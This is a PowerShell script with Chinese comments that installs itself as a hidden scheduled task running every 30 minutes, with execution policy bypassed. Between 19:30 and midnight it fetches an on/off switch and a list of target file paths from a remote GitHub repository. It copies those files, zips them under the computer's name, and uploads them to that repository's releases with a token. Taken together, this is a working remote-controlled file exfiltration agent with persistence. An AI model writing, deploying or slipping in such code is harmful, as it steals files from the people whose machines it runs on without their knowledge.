# === console.ps1 单文件自注册上传脚本 ===
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# ==== 配置部分 ====
$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
$taskName = "console"

if (-not $token) {
    Write-Host "❌ GH_TOKEN 未设置，脚本终止"
    exit 1
}

# ==== 时间限制（每天 19:30 - 00:00） ====
$now = Get-Date
$startTime = [datetime]::Today.AddHours(19).AddMinutes(30)
$endTime = [datetime]::Today.AddDays(1)  # 次日 00:00
if ($now -lt $startTime -or $now -ge $endTime) {
    Write-Host "🕒 当前不在上传时间范围（19:30 ~ 00:00），退出"
    exit 0
}

# ==== 注册计划任务（如不存在） ====
$taskExists = schtasks /Query /TN $taskName 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "🛠️ 计划任务 $taskName 不存在，开始注册..."
    $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    schtasks /Create /TN $taskName /TR $taskRun /SC MINUTE /RI 30 /F
    if ($LASTEXITCODE -eq 0) {
        Write-Host "✅ 计划任务注册成功（每 30 分钟运行）"
    } else {
        Write-Host "❌ 计划任务注册失败，请以管理员身份运行本脚本"
        exit 1
    }
} else {
    Write-Host "ℹ️ 计划任务 $taskName 已存在，跳过注册"
}

# ==== 获取上传配置 ====
$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

# ==== 检查上传开关 ====
try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Write-Host "🛑 上传开关未启用，退出"
        exit 0
    }
} catch {
    Write-Warning "❌ 无法读取上传开关：$($_.Exception.Message)"
    exit 1
}

# ==== 获取路径列表 ====
try {
    $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
    Write-Host "`n📦 上传路径列表："
    $uploadPaths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Warning "❌ 无法读取路径配置：$($_.Exception.Message)"
    exit 1
}

# ==== 拷贝文件到临时目录（包括尽量拷贝被占用文件） ====
$tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

foreach ($path in $uploadPaths) {
    if (-not (Test-Path $path)) {
        Write-Warning "⚠️ 路径不存在，跳过：$path"
        continue
    }
    $item = Get-Item $path -Force
    try {
        if ($item.PSIsContainer) {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "📁 已复制目录：$($item.FullName)"
        } else {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
            Write-Host "📄 已复制文件：$($item.FullName)"
        }
    } catch {
        Write-Warning "⚠️ 无法复制：$($item.FullName)"
    }
}

# ==== 压缩为 ZIP ====
Add-Type -AssemblyName System.IO.Compression.FileSystem
$computerName = $env:COMPUTERNAME
$tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$zipPath = "$env:TEMP\$tag.zip"
try {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
    Write-Host "📦 已压缩为 ZIP：$zipPath"
} catch {
    Write-Warning "❌ 压缩失败：$($_.Exception.Message)"
    Remove-Item $tempDir -Recurse -Force
    exit 1
}
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# ==== 上传到 GitHub Release ====
$uploadUrl = "https://api.github.com/repos/$repo/releases"
$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "upload-script"
    Accept        = "application/vnd.github+json"
}
try {
    $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
        tag_name   = $tag
        name       = $tag
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3)

    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
    Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent"   = "upload-script"
    } -InFile $zipPath

    Write-Host "`n✅ 上传成功：$tag.zip"
} catch {
    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
}

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
